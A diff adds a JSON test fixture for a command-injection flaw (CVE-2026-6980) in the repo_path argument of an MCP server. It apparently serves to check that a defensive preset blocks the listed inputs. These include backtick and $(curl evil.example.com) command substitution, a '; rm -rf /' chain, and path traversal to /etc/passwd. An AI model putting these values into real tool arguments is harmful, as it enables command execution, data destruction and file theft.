@@ -1,0 +1,50 @@
+{
+  "cve": "CVE-2026-6980",
+  "disclosed_at": "2026-04-25",
+  "product": "Divyanshu-hash/GitPilot-MCP",
+  "cvss_v3": 7.3,
+  "patch_status": "vendor unresponsive; project does not version",
+  "description": "The repo_path argument of main.py reaches OS command execution. Public PoC. No upstream fix; preset must match by tool-name regex, not by version pin.",
+  "primary_source": "https://www.redpacketsecurity.com/cve-alert-cve-2026-6980-divyanshu-hash-gitpilot-mcp/",
+  "secondary_sources": [
+    "https://vulnerability.circl.lu/vuln/CVE-2026-6980"
+  ],
+  "airlock_preset": "gitpilot_mcp_cve_2026_6980_defaults",
+  "payloads": [
+    {
+      "name": "public_poc_backtick",
+      "field": "repo_path",
+      "value": "/tmp/repo`whoami`",
+      "disclosed_at": "2026-04-25",
+      "expected": "blocked"
+    },
+    {
+      "name": "semicolon_rm_chain",
+      "field": "repo_path",
+      "value": "/tmp/repo; rm -rf /",
+      "disclosed_at": "2026-04-25",
+      "expected": "blocked"
+    },
+    {
+      "name": "command_substitution",
+      "field": "repo_path",
+      "value": "/tmp/repo$(curl evil.example.com)",
+      "disclosed_at": "2026-04-25",
+      "expected": "blocked"
+    },
+    {
+      "name": "relative_path_traversal",
+      "field": "repo_path",
+      "value": "../../../etc/passwd",
+      "disclosed_at": "2026-04-25",
+      "expected": "blocked"
+    },
+    {
+      "name": "path_outside_safe_root",
+      "field": "repo_path",
+      "value": "/etc/secrets",
+      "disclosed_at": "2026-04-25",
+      "expected": "blocked"
+    }
+  ]
+}
